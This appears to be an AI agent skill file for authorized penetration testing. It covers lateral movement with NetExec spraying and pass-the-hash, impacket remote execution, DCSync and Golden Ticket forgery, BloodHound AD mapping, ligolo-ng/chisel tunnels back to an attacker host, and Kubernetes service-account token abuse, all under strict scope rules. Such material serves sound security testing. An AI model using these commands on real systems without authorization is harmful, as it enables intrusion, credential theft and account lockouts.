---
name: lateral-movement
description: Use to move from one compromised host to other in-scope systems during an authorized penetration test — credential reuse, AD attack-path mapping, K8s/cloud pivots. Triggers "pivot from this foothold to the subnet", "map the AD attack paths to Domain Admin". Not for gaining the foothold (`initial-access`), escalating (`privilege-escalation`), or cracking creds (`credential-attacks`). Owned/lab only, under a committed scope file; never touch out-of-scope hosts.
---

# Penetration Testing — Lateral Movement (NetExec · impacket · BloodHound CE · ligolo-ng/chisel/sshuttle · K8s pivots)

Lateral movement takes one foothold and reaches the **rest of the in-scope environment**: reuse captured credentials to authenticate to other hosts, pivot network traffic through the compromised host into segments you couldn't reach directly, and — in an Active Directory estate — map the shortest path from where you are to Domain Admin. The defining risk of this step is **scope**: a pivot makes out-of-scope hosts *reachable*, and reaching them is a boundary violation.

> **⚠️ Authorized self-testing only — owned/lab targets, and the scope file bounds every hop.** Lateral movement is where a run most easily drifts out of scope, because a pivot exposes whole networks. **Only the in-scope hosts/CIDRs in the engagement scope file may be touched; a host that becomes reachable through a pivot but is not in scope is never touched.** Re-read the scope file before every hop; if the next hop would land on an out-of-scope host, **halt the run and report** — do not touch it and note it later. Credential spraying (NetExec) can lock out real accounts (a self-inflicted DoS) — it is gated, threshold-agreed, and production-excluded by default.

```
Authorization: engagement=<NNN>  in-scope-hosts=<CIDRs/hosts>  exclusions=<never-touch>
               authorized-by=<name>  window=<start>..<expiry>  environment=lab|production(2nd sign-off)
```

This skill is **language-agnostic** and is loaded by the **`penetration-tester`** agent in its **Lateral movement** step. It owns *reaching other in-scope hosts*; the credentials it reuses come from `penetration-testing:credential-attacks` (its feedstock).

> **Two spines, stated per finding.** Lateral movement maps to **MITRE ATT&CK Enterprise**: `T1021` Remote Services (`.002` SMB/Admin Shares, `.004` SSH, `.006` WinRM), `T1550` Use Alternate Authentication Material (`.002` Pass the Hash, `.003` Pass the Ticket), `T1078` Valid Accounts, `T1572` Protocol Tunneling + `T1090.001` Internal Proxy (pivoting), `T1482` Domain Trust Discovery / `T1069` Permission Groups Discovery (AD mapping), `T1528` Steal Application Access Token + `T1550.001` (K8s). Score CVSS in `penetration-testing:reporting`.

## Credential reuse — NetExec (nxc), the CrackMapExec successor

> **Load-bearing rename: CrackMapExec is dead; NetExec (`nxc`) is the maintained successor.** CME was retired in 2023; NeffIsBack/Marshall-Hallenbeck/zblurx forked it as **NetExec** (`Pennyw0rth/NetExec`) and renamed the command `crackmapexec` → **`nxc`**. Use NetExec; CME tutorials are stale.

**NetExec** (current tag **v1.5.1**, but the tag lags `main` by hundreds of commits — install from git for current modules) sprays and validates credentials across a subnet over many protocols and executes on hosts where they are admin.

```bash
# Install current main (the tagged release lags heavily):
pipx install git+https://github.com/Pennyw0rth/NetExec

# Validate/spray creds across an in-scope subnet — flags (Pwn3d!) where the cred is local admin.
nxc smb 10.0.10.0/24 -u users.txt -p 'Passw0rd!'        # protocols: smb winrm ldap mssql ssh rdp wmi nfs
# Pass-the-Hash (no plaintext needed):
nxc smb 10.0.10.0/24 -u administrator -H <NTLM_hash>
# Remote command exec where admin:
nxc smb 10.0.10.5 -u admin -H <hash> -x "whoami"        # -X for PowerShell
# Secrets extraction from a host you own on:
nxc smb 10.0.10.5 -u admin -H <hash> --sam --lsa --ntds
# Kerberoast / AS-REP roast:
nxc ldap dc01.corp.local -u u -p p --kerberoasting out.txt --asreproast out2.txt
```

- **Very noisy, high-impact.** Spraying trips **account lockout** — locking out real users is a self-inflicted availability incident. Agree the lockout threshold with the owner, cap attempts, and **exclude production** by default. `v1.5.1 was itself a security patch** (a `spider_plus` file-write bug) — run a current build.
- **ATT&CK:** `T1550.002` (PtH `-H`), `T1078`, `T1021.002`/`.006`, `T1110` (spray), `T1003.002`/`.006` (SAM/NTDS), `T1558.003`/`.004` (roasting).

## Credential reuse — impacket (the Fortra toolkit)

**impacket** (Fortra, current **0.13.1**; repo `fortra/impacket`, the old `CoreSecurity` org redirects) is the script toolkit for SMB/WMI RCE and Kerberos abuse.

```bash
pipx install impacket           # or pin: pipx install 'impacket @ git+https://github.com/fortra/impacket@0.13.1'
```

| Script | Does | Footprint | ATT&CK |
|---|---|---|---|
| `wmiexec.py` | RCE over WMI (no service created — the **quieter** choice) | low | T1047, T1021.002 |
| `psexec.py` | RCE via an uploaded **Windows service** (Event ID 7045 — loud, classic detection) | high | T1021.002, T1569.002 |
| `secretsdump.py` | SAM/LSA + **NTDS via DCSync** (`-just-dc`) | DC-touching, loud | **T1003.006 DCSync** |
| `GetUserSPNs.py -request` | **Kerberoasting** | LDAP query | T1558.003 |
| `GetNPUsers.py` | **AS-REP roasting** | LDAP query | T1558.004 |
| `getTGT.py` / `getST.py` | Request TGT/ST → `.ccache` for **Pass-the-Ticket** | low | T1550.003 |
| `ticketer.py` | Forge **Golden/Silver** tickets (needs krbtgt/service hash) | **persistence-grade** | T1558.001/.002 |

- Pass-the-Hash across all: `-hashes LM:NT`. Pass-the-Ticket: `export KRB5CCNAME=t.ccache` then `-k -no-pass`.
- **`ticketer.py` Golden Tickets are persistence/forgery** — a forged TGT can outlive the engagement. If the krbtgt hash is used, treat it as crown-jewel loot (redacted), document it, and flag krbtgt rotation to the owner. `wmiexec.py` over `psexec.py` when stealth/artifact-minimization matters (no service, no Event 7045).

## Active Directory attack paths — BloodHound CE + collectors

> **Load-bearing reorg: BloodHound Community Edition (CE) replaced legacy BloodHound 4.x.** The canonical org is **SpecterOps** (the old `BloodHoundAD` org is deprecated); legacy lives at `SpecterOps/BloodHound-Legacy` (v4.3.1, unmaintained, being archived). Use CE.

**BloodHound CE** (current stable **v9.5.1**) ingests collector data and renders the AD/Entra graph so you can query the shortest abusable path to a target (e.g. Domain Admins).

```bash
# CE is a Docker-compose stack (app/API + PostgreSQL + Neo4j), orchestrated by bloodhound-cli:
curl -L https://ghst.ly/getbhce | docker compose -f - up      # or: bloodhound-cli install
```

- **SharpHound** (current **v2.14.0** — still the C# collector; there is no official Rust rewrite, though the community `RustHound-CE` crate is a cross-platform fallback). **Download the collector from the running CE UI** (Settings → Download Collectors) so its version matches — CE v8+ changed the collector output (OpenGraph), so pre-v8 data must be re-collected.
  ```
  SharpHound.exe -c All          # all methods — LOUD (LDAP + SMB/RPC to every host)
  SharpHound.exe -c DCOnly       # LDAP-only against DCs — quieter, no per-host touch
  SharpHound.exe -c All --Stealth # reduced host contact
  ```
- **AzureHound** (current **v3.0.0**, Go) collects **Entra ID** (formerly Azure AD): `azurehound -u user@tenant -p pass list --tenant <id> -o out.json` → import to CE. Read-only Graph/ARM calls, but logged in Entra sign-in/audit.
- **In the graph:** query in **Cypher**; the built-in "Shortest Path to Domain Admins" and pathfinding tab render abusable edges (`GenericAll`, `WriteDacl`, `DCSync`, `AdminTo`, `HasSession`). The collected graph is **sensitive loot** (every user/ACL/session) — treat the Neo4j DB per the scope file's data-handling, segregated and redacted.
- **Footprint:** `-c All` is **loud on the wire** (high LDAP + SMB/RPC to every enumerated host) — EDR/AD-monitoring flags it. Prefer `DCOnly`/`--Stealth`, authenticated with a scoped test account, in agreed windows. ATT&CK `T1069`/`.001`/`.002`, `T1482`, `T1087`/`.004`, `T1018`, `T1033`.

## Network pivoting / tunnelling — reach segments through the foothold

Pivoting routes your traffic *through* the compromised host into networks you can't reach directly. **Every pivot is a scope hazard** — it exposes whole subnets, and only the in-scope hosts in them may be touched.

- **SSH forwarding** (native OpenSSH, `-J` needs ≥7.3) — lowest-noise, blends with admin traffic, needs valid creds/keys:
  - `ssh -D 1080 user@pivot` (dynamic SOCKS → `proxychains`), `-L`/`-R` (local/remote forward), `-J` (ProxyJump chaining). ATT&CK `T1021.004`, `T1572`, `T1090.001`.
- **ligolo-ng** (current **v0.9.1** — the modern favorite) — presents the pivoted networks as a real **TUN interface** on your host, so nmap/UDP/ICMP work natively with **no proxychains**:
  ```
  # attacker: sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
  ./proxy -selfcert                       # attacker
  ./agent -connect <attacker>:11601 -ignore-cert   # on the pivot
  # in the proxy console: session → ifconfig → add route to the in-scope subnet via ligolo → start
  ```
  Install pinned: `go install github.com/nicocha30/ligolo-ng/cmd/{proxy,agent}@v0.9.1`. Creates a TUN + routes on the **attacker** (needs root there) — clean both up. ATT&CK `T1572`, `T1090.001`.
- **chisel** (current **v1.11.8** — v1.12 is RC, don't pin an rc) — reverse SOCKS over HTTP/WS: `chisel server -p 8080 --reverse` + `chisel client <atk>:8080 R:socks`. Drops a Go binary (EDR-signatured). `go install github.com/jpillora/chisel@v1.11.8`.
- **sshuttle** (current **v1.3.2**) — poor-man's VPN over SSH, **no binary dropped on the pivot** (pushes Python over the SSH session): `sshuttle -r user@pivot 10.0.10.0/24`. TCP+DNS only. Canonical repo `sshuttle/sshuttle` (apenwarr redirects). `pipx install sshuttle==1.3.2`.

## Kubernetes / cloud pivots

A compromised pod's mounted ServiceAccount token (`/var/run/secrets/kubernetes.io/serviceaccount/token`) is a pivot into the cluster API:

- **Enumerate your rights first:** `kubectl auth can-i --list` (and `--list -n <ns>` to test **namespace hopping** — a ClusterRoleBinding may grant cluster-wide reach).
- **Use the token:** `kubectl --token=$TOKEN --certificate-authority=ca.crt --server=https://kubernetes.default.svc get pods,secrets -A`; read other pods' mounted secrets.
- **peirates** (current **v1.1.28**, inguardians) automates the loop (token harvest → RBAC test → secrets → cloud-metadata creds → privileged/hostPath pod for node access). ATT&CK `T1528` (Steal App Access Token — MITRE names peirates), `T1550.001`, `T1613`, `T1610`.
- **High-signal:** every API call is in the **Kubernetes audit log**. Deploying a privileged/hostPath pod (`T1610`) is destructive-adjacent — a **separate, explicitly-authorized** act, non-production cluster only. Cloud-metadata credential theft needs in-scope cloud-account sign-off. Delete any pods you create at cleanup.

## Anti-patterns

- **Touching an out-of-scope host because a pivot made it reachable.** The most common scope violation of the step. *Fix:* re-read the scope file before every hop; an out-of-scope host reachable through a pivot is never touched — halt and report.
- **Credential spraying without an agreed lockout threshold.** Locks out real users = self-inflicted DoS. *Fix:* agree the threshold, cap attempts, exclude production by default.
- **`psexec.py` when `wmiexec.py` would do.** psexec creates a service (Event 7045) — a loud artifact. *Fix:* prefer wmiexec for quieter RCE; enumerate and remove any service/artifact created.
- **Using a Golden Ticket and not flagging krbtgt rotation.** A forged TGT outlives the engagement. *Fix:* document it, redact the hash, flag krbtgt rotation to the owner, and remove the `.ccache` at cleanup.
- **Committing the BloodHound graph / captured creds.** The AD graph and creds are loot. *Fix:* segregate per the scope file's data-handling; report blast radius, never contents; nothing sensitive under `docs/security/`.
- **Leaving the pivot binary / TUN interface / created pod behind.** *Fix:* enumerate every chisel/ligolo binary, TUN interface, route, and created pod; remove and log at cleanup.

## Rules (hard constraints)

- **The scope file bounds every hop.** Only in-scope hosts touched; a host made reachable by a pivot but not in scope is never touched. Re-read before each hop; halt and report on an out-of-scope next act.
- **Credentials come from `penetration-testing:credential-attacks`** (feedstock); this skill reuses them, it does not capture/crack them.
- **Spraying is lockout-risk** — threshold-agreed, capped, production-excluded by default. **No DoS, ever.**
- **Prefer quiet, artifact-minimal techniques** (wmiexec over psexec; DCOnly/Stealth collection; sshuttle's no-drop pivot) and enumerate/remove every artifact at cleanup.
- **Two spines per finding:** ATT&CK Enterprise (Lateral Movement / Credential Access / Discovery tactics) + CVSS in `penetration-testing:reporting`.
- **Loot redaction:** AD graph, creds, tickets → blast radius only, segregated per the scope file's data-handling, never committed.
- **Log every act** — command, target, timestamp, ATT&CK id — into the engagement action log.

## Cross-references

- **`penetration-tester`** — the orchestrator; runs this in its **Lateral movement** step, owns the scope-file gate.
- **`penetration-testing:initial-access`** — supplies the foothold used as the pivot.
- **`penetration-testing:credential-attacks`** — the **feedstock**: captures/cracks the credentials this skill reuses (hashes → PtH, cracked passwords → spray).
- **`penetration-testing:privilege-escalation`** — root/SYSTEM on a host often unlocks the credential material that enables the next lateral hop.
- **`penetration-testing:post-exploitation`** — owns cleanup of every pivot binary, TUN interface, forged ticket, and created pod this step leaves.
- **`infra-security-tester`** (`devops/`) — the posture sibling; its K8s/cloud/network-policy findings scope where a pivot could go. `data-architect` owns the cross-tenant isolation this step would test.
- **`penetration-testing:reporting`** — action log + CVSS/ATT&CK scoring of every hop and the AD path.
